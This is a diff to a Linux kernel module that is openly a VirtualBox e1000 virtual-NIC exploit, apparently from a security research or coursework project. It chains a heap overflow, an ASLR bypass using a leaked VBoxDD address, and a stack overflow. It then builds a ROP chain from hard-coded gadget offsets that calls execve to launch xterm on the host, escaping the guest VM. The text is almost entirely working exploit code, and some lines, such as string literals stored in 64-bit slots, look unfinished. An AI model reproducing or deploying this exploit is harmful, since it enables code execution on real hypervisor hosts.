@@ -21,7 +21,7 @@ MODULE_SUPPORTED_DEVICE("none");
 MODULE_LICENSE("TLS-SEC");
 
 #define NB_MAX_DESC 256
-#define LEAKED_VBOXDD_VAO 0x20E600
+#define LEAKED_VBOXDD_VAO 0x1F6B00 //0x20E500
 
 /* ========================== METHOD DECLARATION ========================== */
 static int __init e1k_init(void);
@@ -33,8 +33,8 @@ static void disable_loopback(void);
 static void heap_overflow(uint16_t new_addr);
 static void write_primitive(uint16_t address, uint16_t value);
 static uint64_t aslr_bypass(void);
-static void stack_overflow(void);
-static void nx_bypass(void);
+static void stack_overflow(uint64_t leaked_addr);
+static void nx_bypass(uint64_t leaked_addr);
 
 /* ==================== GLOBAL VARIABLES DECLARATION ====================== */
 uint8_t * bar0, * tx_buffer;
@@ -55,15 +55,16 @@ uint16_t mu16Data[64] =
 /* ------------------------------ Constructor ----------------------------- */
 static int __init e1k_init(void)
 {
+	uint64_t leaked_addr;
 	bar0 = map_mmio();
 	if (!bar0) {
 		pr_info("e1k : failed to map mmio");
 		return -1;
 	}
 	e1k_configure();	
-	aslr_bypass();
+	leaked_addr = aslr_bypass();
 
-	nx_bypass();
+	nx_bypass(leaked_addr);
 	
 	pr_info("Pwnd");
 	return 0;
@@ -121,7 +122,7 @@ static void e1k_configure(void)
 		tx_ring[i].ctxt.cmd_and_length = DESC_DONE;
 	}
 
-	tx_buffer = kmalloc(PAYLOAD_LEN, GFP_KERNEL);
+	tx_buffer = kmalloc(PAYLOAD_LEN + 0x1000, GFP_KERNEL);
 	if (!tx_buffer) {
 		pr_info("e1k : failed to allocate TX Buffer\n");
 		return;
@@ -358,11 +359,17 @@ static uint64_t aslr_bypass(void)
 	return vboxdd_base;
 }
 
-static void stack_overflow(void)
+static void stack_overflow(uint64_t leaked_addr)
 {
-	int i;
+	int i, j = 0;
 	uint32_t	tdt;
 	uint64_t 	physical_address;
+	
+	uint64_t pop_rax_offset = 0x9b60;
+	uint64_t syscall_offset = 0x12bee6;
+	uint64_t pop_rdi_offset = 0x17955d;
+	uint64_t pop_rsi_offset = 0x1e15ce;
+	uint64_t pop_rdx_offset = 0x5dd50;
 
 	struct e1000_ctxt_desc*	ctxt_1 = &(tx_ring[idx+0].ctxt);
 	struct e1000_data_desc*	data_2 = &(tx_ring[idx+1].data);
@@ -380,13 +387,27 @@ static void stack_overflow(void)
 	for (i = 0x3F90; i < 0x3F98; ++i) {
 		tx_buffer[i] = 0x00; // Fill with usefull "0"
 	}
-	for (i = 0x3F98; i < 0x4000; ++i) {
+	for (i = 0x3F98; i < 0x4068; ++i) {
 		tx_buffer[i] = 0x61; // Fill with garbage "a"
 	}
-	//tx_buffer[PAYLOAD_LEN - 164]	= 0x20;
-	//tx_buffer[PAYLOAD_LEN - 163]	= 0xc0;
+	
+	for (i = 0x4008; i < 0x4010; ++i) {
+		//tx_buffer[i] = leaked_addr[j++];
+	}
 	tx_buffer[PAYLOAD_LEN - 152]	= 0x00;
 	tx_buffer[PAYLOAD_LEN - 151]	= 0x00;
+	
+	// Setup payload
+	uint64_t * codebuff = (uint64_t *) &(tx_buffer[0x4060]);
+	codebuff[0] = leaked_addr + pop_rdi_offset;
+	codebuff[1] = "/usr/bin/xterm";
+	codebuff[2] = leaked_addr + pop_rsi_offset;
+	codebuff[3] = "/usr/bin/xterm";
+	codebuff[4] = leaked_addr + pop_rdx_offset;
+	codebuff[5] = "DISPLAY=:0.0";
+	codebuff[6] = leaked_addr + pop_rax_offset;
+	codebuff[7] = 59;
+	codebuff[8] = leaked_addr + syscall_offset;
 
 	//-----------------------------------------//
 
@@ -408,11 +429,11 @@ static void stack_overflow(void)
 	
 	ctxt_4->lower_setup.ip_config	= (uint32_t) 0;
 	ctxt_4->upper_setup.tcp_config	= (uint32_t) 0;
-	ctxt_4->cmd_and_length			= (uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | 0x4000);
+	ctxt_4->cmd_and_length			= (uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | 0x40A0/*0x4040*/);
 	ctxt_4->tcp_seg_setup.data		= (uint32_t) ((0xF << 16));
 	
 	data_5->buffer_addr				= (uint64_t) physical_address;
-	data_5->lower.data				= (uint32_t) (EOP | REPORT_STATUS | DESC_DATA | 0x4000 | TSE);
+	data_5->lower.data				= (uint32_t) (EOP | REPORT_STATUS | DESC_DATA | 0x40A0/*0x4040*/ | TSE);
 	data_5->upper.data				= (uint32_t) 0;
 	//-----------------------------------------//
 
@@ -424,10 +445,10 @@ static void stack_overflow(void)
 	
 }
 
-static void nx_bypass(void)
+static void nx_bypass(uint64_t leaked_addr)
 {
 	pr_info("##### Stage 2 #####\n");
 	enable_loopback();
-	stack_overflow();
+	stack_overflow(leaked_addr);
 	disable_loopback();
 }
